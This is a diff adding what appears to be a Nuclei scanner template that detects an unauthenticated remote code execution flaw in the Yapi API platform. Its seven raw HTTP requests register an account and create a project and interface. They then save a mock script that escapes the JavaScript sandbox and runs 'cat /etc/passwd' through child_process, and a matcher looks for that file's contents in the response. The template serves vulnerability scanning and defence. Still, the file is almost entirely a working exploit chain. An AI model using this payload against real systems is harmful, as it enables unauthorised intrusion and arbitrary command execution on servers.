@@ -1,0 +1,99 @@
+id: yapi-rce
+
+info:
+  name: Yapi - Remote Code Execution
+  author: pikpikcu
+  severity: critical
+  description: Yapi allows remote unauthenticated attackers to cause the product to execute arbitrary code.
+  reference:
+    - https://www.secpulse.com/archives/162502.html
+    - https://gist.github.com/pikpikcu/0145fb71203c8a3ad5c67b8aab47165b
+    - https://twitter.com/sec715/status/1415484190561161216
+    - https://github.com/YMFE/yapi
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: yapi,rce
+
+requests:
+  - raw:
+      - | # REQUEST 1
+        POST /api/user/reg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"{{randstr}}@interact.sh","password":"{{randstr}}","username":"{{randstr}}"}
+
+      - | # REQUEST 2
+        GET /api/group/list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json, text/plain, */*
+
+      - | # REQUEST 3
+        POST /api/project/add HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
+
+      - | # REQUEST 4
+        GET /api/project/get?id={{project_id}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - | # REQUEST 5
+        POST /api/interface/add HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}
+
+      - | # REQUEST 6
+        POST /api/plugin/advmock/save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}
+
+      - | # REQUEST 7
+        GET /mock/{{project_id}}/{{randstr_1}} HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    extractors:
+      - type: regex
+        name: group_id
+        group: 1
+        internal: true
+        part: body
+        regex:
+          - '"_id":([0-9]+),"group_name"'
+
+      - type: regex
+        name: interface_id
+        group: 1
+        internal: true
+        part: body
+        regex:
+          - '"req_body_form":\[\],"_id":([0-9]+)'
+
+      - type: regex
+        name: project_id
+        group: 1
+        internal: true
+        part: body
+        regex:
+          - '"tag":\[\],"_id":([0-9]+)'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/06/03
